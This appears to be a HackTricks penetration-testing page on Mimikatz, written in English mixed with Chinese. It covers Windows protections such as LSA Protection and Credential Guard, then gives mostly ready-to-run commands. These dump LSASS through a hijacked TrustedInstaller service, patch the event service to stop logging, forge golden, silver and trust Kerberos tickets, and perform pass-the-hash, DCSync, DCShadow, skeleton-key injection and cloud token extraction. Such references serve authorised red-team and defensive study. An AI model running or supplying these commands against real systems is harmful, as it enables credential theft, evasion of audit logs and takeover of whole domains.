# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**This page is based on one from [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Check the original for further info!

## LM and Clear-Text in memory

From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:

- **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.

- **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
1. Modifying the registry at _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.

Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.

On modern workstations this matters even more because **Credential Guard is enabled by default on many Windows 11 22H2+ and Windows Server 2025 domain-joined, non-DC systems**, while **LSASS-as-PPL is enabled by default on fresh Windows 11 22H2+ installs**. In practice, this means `sekurlsa::logonpasswords` often yields less material than older tradecraft expected and operators increasingly pivot to **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, or **CloudAP/PRT-oriented modules**. For the protection side, check [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
这允许将 `lsass.exe` 的内存转储到一个文件中，然后可以在另一台系统上对其进行分析以提取凭据：
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Mimikatz 中的 Event log tampering 涉及两个主要动作：清除 event logs，以及 patching Event service 以阻止新事件被记录。下面是执行这些动作的命令：

#### Clearing Event Logs

- **Command**: 此操作旨在删除 event logs，使恶意活动更难被追踪。
- Mimikatz 在其标准文档中并未提供一个可直接通过命令行清除 event logs 的直接命令。不过，event log manipulation 通常涉及使用 system tools 或 Mimikatz 之外的脚本来清除特定日志（例如使用 PowerShell 或 Windows Event Viewer）。

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- 这个 experimental command 旨在修改 Event Logging Service 的行为，从而有效阻止其记录新事件。
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` 命令确保 Mimikatz 以修改 system services 所需的权限运行。
- `event::drop` 命令随后 patching Event Logging service。

### Kerberos Ticket Attacks

Use the commands below as quick syntax reminders. The dedicated pages for [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), and [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contain the up-to-date AES/PAC/opsec nuances.

### Golden Ticket Creation

A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: The domain name.
- `/sid`: The domain's Security Identifier (SID).
- `/user`: The username to impersonate.
- `/krbtgt`: The NTLM hash of the domain's KDC service account.
- `/ptt`: Directly injects the ticket into memory.
- `/ticket`: Saves the ticket for later use.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Ticket 授予对特定服务的访问权限。关键命令和参数：

- Command: 类似于 Golden Ticket，但针对特定服务。
- Parameters:
- `/service`: 要目标的服务（例如，cifs, http）。
- Other parameters 类似于 Golden Ticket。

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Tickets 用于通过利用信任关系访问跨域资源。关键命令和参数：

- Command: 类似于 Golden Ticket，但用于信任关系。
- Parameters:
- `/target`: 目标域的 FQDN。
- `/rc4`: 信任账户的 NTLM hash。

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Additional Kerberos Commands

- **Listing Tickets**:

- Command: `kerberos::list`
- 列出当前用户会话的所有 Kerberos tickets。

- **Pass the Cache**:

- Command: `kerberos::ptc`
- 从缓存文件中注入 Kerberos tickets。
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- 允许在另一个会话中使用 Kerberos ticket。
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**：
- Command: `kerberos::purge`
- 清除会话中的所有 Kerberos tickets。
- 在使用 ticket 操作命令之前很有用，可避免冲突。

### Over-Pass-the-Hash / Pass-the-Key

如果 `RC4` 被禁用或不可靠，Mimikatz 可以将 **AES128/AES256 Kerberos keys** 补丁到当前登录会话中，而不只是使用 NT hash。对于现代域来说，这通常比把 `sekurlsa::pth` 当作仅限 NTLM 的方法更合适。
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` 会复用当前进程，而不是启动一个新的 console，这在你想立即在同一上下文中运行像 `lsadump::dcsync` 这样的命令时很方便。

### Active Directory Tampering

- **DCShadow**: 临时让一台机器充当 DC，用于 AD object manipulation。See [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: 模拟一个 DC 来请求 password data。See [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: 从 LSA 中提取 credentials。

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: 使用 computer account 的 password data 冒充一个 DC。

- _原始上下文中未提供 NetSync 的特定命令。_

- **LSADUMP::SAM**: 访问本地 SAM database。

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: 解密存储在 registry 中的 secrets。

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: 为用户设置新的 NTLM hash。

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: 获取 trust authentication information。
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

在 **Entra ID** 或 **hybrid-joined** 主机上，`sekurlsa::cloudap` 可以从 LSASS 中暴露缓存的 **Primary Refresh Token (PRT)** 材料。若关联的 Proof-of-Possession key 由软件保护，`dpapi::cloudapkd` 可以派生后续 **Pass-the-PRT** 工作流所需的明文/派生 key 材料。
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
当密钥由 TPM-backed 保护时，这会变得更加困难，但在 hybrid endpoints 上仍值得检查，因为缓存的 CloudAP 数据可能比经典的 `wdigest` 输出更有价值。关于 cloud-side abuse chain，参见 [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html)。

### Miscellaneous

- **MISC::Skeleton**: 在 DC 上向 LSASS 注入后门。
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: 获取备份权限。

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: 获取调试权限。
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: 显示已登录用户的凭证。

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: 从内存中提取 Kerberos tickets。
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: 更改 SID 和 SIDHistory。

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _No specific command for modify in original context._

- **TOKEN::Elevate**: 冒充 tokens。
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: 允许多个 RDP 会话。

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: 列出 TS/RDP 会话。
- _No specific command provided for TS::Sessions in original context._

### Vault

- 从 Windows Vault 中提取密码。
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
